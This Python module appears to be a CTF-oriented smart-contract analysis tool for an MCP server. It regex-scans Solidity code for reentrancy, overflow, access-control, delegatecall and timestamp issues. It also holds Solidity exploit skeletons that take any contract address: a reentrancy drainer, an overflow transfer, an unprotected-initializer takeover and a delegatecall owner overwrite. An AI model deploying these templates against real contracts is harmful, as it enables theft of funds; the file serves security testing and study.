"""Smart contract vulnerability analysis tools for ChainSolver MCP server."""

from __future__ import annotations

import re
from typing import Any


# ---------------------------------------------------------------------------
# Vulnerability pattern rules (static, regex-based)
# ---------------------------------------------------------------------------

_REENTRANCY_PATTERNS = [
    # external call before state update
    re.compile(r"\.call\{.*\}\(", re.MULTILINE),
    re.compile(r"\.transfer\(", re.MULTILINE),
    re.compile(r"\.send\(", re.MULTILINE),
]

_OVERFLOW_PATTERNS = [
    # unchecked block (explicit opt-out in >=0.8)
    (re.compile(r"\bunchecked\s*\{", re.MULTILINE), "unchecked block — arithmetic inside is not protected"),
    # subtraction assignment — most common underflow vector
    (re.compile(r"\w[\w\[\]\.]*\s*-=\s*\w", re.MULTILINE), "subtraction assignment (-=), potential underflow"),
    # addition assignment
    (re.compile(r"\w[\w\[\]\.]*\s*\+=\s*\w", re.MULTILINE), "addition assignment (+=), potential overflow"),
    # multiplication assignment
    (re.compile(r"\w[\w\[\]\.]*\s*\*=\s*\w", re.MULTILINE), "multiplication assignment (*=), potential overflow"),
    # increment / decrement
    (re.compile(r"\+\+\s*\w+|\w+\s*\+\+|--\s*\w+|\w+\s*--", re.MULTILINE), "increment/decrement, potential overflow/underflow"),
]

# Access control: only flag genuinely suspicious patterns, not every public function
_ACCESS_CONTROL_PATTERNS = [
    (re.compile(r"\btx\.origin\b", re.MULTILINE),
     "tx.origin used for auth — can be bypassed via phishing contract"),
    (re.compile(r"selfdestruct\s*\(", re.MULTILINE),
     "selfdestruct present — verify it is properly access-controlled"),
    # public/external state-changing functions that lack any modifier (no onlyOwner / require(msg.sender ==))
    (re.compile(
        r"function\s+\w+\s*\([^)]*\)\s*(?:public|external)(?!\s+(?:view|pure))[^{]*\{(?![^}]*(?:onlyOwner|require\s*\(\s*msg\.sender|modifier))",
        re.MULTILINE | re.DOTALL,
    ), "public/external state-changing function with no visible access modifier"),
]

_DELEGATECALL_PATTERN = re.compile(r"\.delegatecall\(", re.MULTILINE)
_TIMESTAMP_PATTERN = re.compile(r"\bblock\.timestamp\b|\bnow\b", re.MULTILINE)


def analyze_vulnerabilities(source_code: str) -> dict[str, Any]:
    """Static analysis of Solidity source code for common CTF vulnerabilities.

    Args:
        source_code: Raw Solidity source code string.
    """
    findings: list[dict[str, Any]] = []

    # Reentrancy
    for pat in _REENTRANCY_PATTERNS:
        for m in pat.finditer(source_code):
            findings.append({
                "type": "reentrancy",
                "severity": "high",
                "match": m.group().strip(),
                "line": source_code[: m.start()].count("\n") + 1,
                "description": "External call detected — verify state is updated before the call.",
            })

    # Integer overflow
    if _is_pre_08(source_code):
        for pat, desc in _OVERFLOW_PATTERNS:
            for m in pat.finditer(source_code):
                findings.append({
                    "type": "integer_overflow",
                    "severity": "medium",
                    "match": m.group().strip(),
                    "line": source_code[: m.start()].count("\n") + 1,
                    "description": f"Arithmetic op in pre-0.8 Solidity: {desc}",
                })

    # Access control
    for pat, desc in _ACCESS_CONTROL_PATTERNS:
        for m in pat.finditer(source_code):
            findings.append({
                "type": "access_control",
                "severity": "high",
                "match": m.group().strip()[:120],
                "line": source_code[: m.start()].count("\n") + 1,
                "description": desc,
            })

    # Delegatecall
    for m in _DELEGATECALL_PATTERN.finditer(source_code):
        findings.append({
            "type": "delegatecall",
            "severity": "high",
            "match": m.group().strip(),
            "line": source_code[: m.start()].count("\n") + 1,
            "description": "delegatecall can allow storage manipulation by callee.",
        })

    # Timestamp dependence
    for m in _TIMESTAMP_PATTERN.finditer(source_code):
        findings.append({
            "type": "timestamp_dependence",
            "severity": "low",
            "match": m.group().strip(),
            "line": source_code[: m.start()].count("\n") + 1,
            "description": "block.timestamp can be manipulated by miners within ~15s.",
        })

    summary = {
        "high": sum(1 for f in findings if f["severity"] == "high"),
        "medium": sum(1 for f in findings if f["severity"] == "medium"),
        "low": sum(1 for f in findings if f["severity"] == "low"),
    }

    return {"findings": findings, "summary": summary, "total": len(findings)}


def detect_reentrancy(source_code: str) -> dict[str, Any]:
    """Focused reentrancy detection with exploit hints.

    Args:
        source_code: Raw Solidity source code string.
    """
    hits: list[dict[str, Any]] = []
    for pat in _REENTRANCY_PATTERNS:
        for m in pat.finditer(source_code):
            line = source_code[: m.start()].count("\n") + 1
            hits.append({"line": line, "match": m.group().strip()})

    vulnerable = len(hits) > 0
    return {
        "vulnerable": vulnerable,
        "hits": hits,
        "exploit_hint": (
            "Deploy an attacker contract whose fallback/receive re-enters the target "
            "withdraw function before the balance is zeroed."
            if vulnerable else "No obvious reentrancy pattern found."
        ),
    }


def detect_integer_overflow(source_code: str) -> dict[str, Any]:
    """Detect integer overflow/underflow risks.

    Args:
        source_code: Raw Solidity source code string.
    """
    pre08 = _is_pre_08(source_code)
    hits: list[dict[str, Any]] = []

    if pre08:
        for pat, desc in _OVERFLOW_PATTERNS:
            for m in pat.finditer(source_code):
                hits.append({
                    "line": source_code[: m.start()].count("\n") + 1,
                    "match": m.group().strip(),
                    "description": desc,
                })

    return {
        "vulnerable": pre08 and len(hits) > 0,
        "pre_08_solidity": pre08,
        "hits": hits,
        "exploit_hint": (
            "Wrap/unwrap arithmetic to trigger overflow — e.g. add to uint max to wrap to 0."
            if pre08 and hits else "No overflow risk detected (Solidity >=0.8 has built-in checks)."
        ),
    }


def detect_access_control(source_code: str) -> dict[str, Any]:
    """Detect access control weaknesses.

    Args:
        source_code: Raw Solidity source code string.
    """
    hits: list[dict[str, Any]] = []
    for pat, desc in _ACCESS_CONTROL_PATTERNS:
        for m in pat.finditer(source_code):
            hits.append({
                "line": source_code[: m.start()].count("\n") + 1,
                "match": m.group().strip()[:120],
                "description": desc,
            })

    return {
        "vulnerable": len(hits) > 0,
        "hits": hits,
        "exploit_hint": (
            "Check for tx.origin auth bypass, unprotected public functions, or selfdestruct calls."
            if hits else "No obvious access control issues found."
        ),
    }


def generate_poc(vulnerability_type: str, contract_address: str, extra: dict[str, Any] | None = None) -> dict[str, Any]:
    """Generate a PoC script skeleton for a given vulnerability type.

    Args:
        vulnerability_type: One of: reentrancy, integer_overflow, access_control, delegatecall.
        contract_address: Target contract address.
        extra: Optional extra context (e.g. function names, ABI snippets).
    """
    templates: dict[str, str] = {
        "reentrancy": _POC_REENTRANCY.format(target=contract_address),
        "integer_overflow": _POC_OVERFLOW.format(target=contract_address),
        "access_control": _POC_ACCESS.format(target=contract_address),
        "delegatecall": _POC_DELEGATECALL.format(target=contract_address),
    }

    vtype = vulnerability_type.lower()
    if vtype not in templates:
        return {"error": f"Unknown vulnerability type: {vulnerability_type}. Choose from: {list(templates)}"}

    return {
        "vulnerability_type": vtype,
        "contract_address": contract_address,
        "language": "solidity",
        "poc": templates[vtype],
        "note": "This is a skeleton — adapt function names and parameters to the actual target.",
    }


# ---------------------------------------------------------------------------
# PoC templates
# ---------------------------------------------------------------------------

_POC_REENTRANCY = """\
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITarget {{
    function withdraw(uint256 amount) external;
    function deposit() external payable;
}}

contract ReentrancyAttack {{
    ITarget public target = ITarget({target});
    uint256 public attackAmount;

    function attack() external payable {{
        attackAmount = msg.value;
        target.deposit{{value: msg.value}}();
        target.withdraw(attackAmount);
    }}

    receive() external payable {{
        if (address(target).balance >= attackAmount) {{
            target.withdraw(attackAmount);
        }}
    }}
}}
"""

_POC_OVERFLOW = """\
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;  // pre-0.8 to allow overflow

interface ITarget {{
    function transfer(address to, uint256 amount) external;
    function balanceOf(address) external view returns (uint256);
}}

contract OverflowAttack {{
    ITarget public target = ITarget({target});

    function attack(address victim) external {{
        // Wrap uint256 max + 1 = 0, or underflow balance check
        uint256 overflowAmount = type(uint256).max;
        target.transfer(victim, overflowAmount + 1);
    }}
}}
"""

_POC_ACCESS = """\
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITarget {{
    function initialize(address owner) external;
    function withdraw() external;
}}

contract AccessAttack {{
    ITarget public target = ITarget({target});

    function attack() external {{
        // Try calling unprotected initializer or admin function
        target.initialize(address(this));
        target.withdraw();
    }}
}}
"""

_POC_DELEGATECALL = """\
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MaliciousLogic {{
    // Slot 0 — matches target's owner slot
    address public owner;

    function pwn() external {{
        owner = tx.origin;
    }}
}}

// Deploy MaliciousLogic, then call target.upgrade(maliciousLogicAddress)
// followed by target.delegatecall to pwn() to overwrite owner in target storage.
// Target: {target}
"""


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _is_pre_08(source: str) -> bool:
    """Heuristic: check if pragma declares Solidity < 0.8."""
    m = re.search(r"pragma\s+solidity\s+([^;]+);", source)
    if not m:
        return False
    spec = m.group(1)
    # e.g. ^0.6.0, >=0.4.0 <0.8.0, 0.7.6
    versions = re.findall(r"0\.(\d+)", spec)
    return any(int(v) < 8 for v in versions)
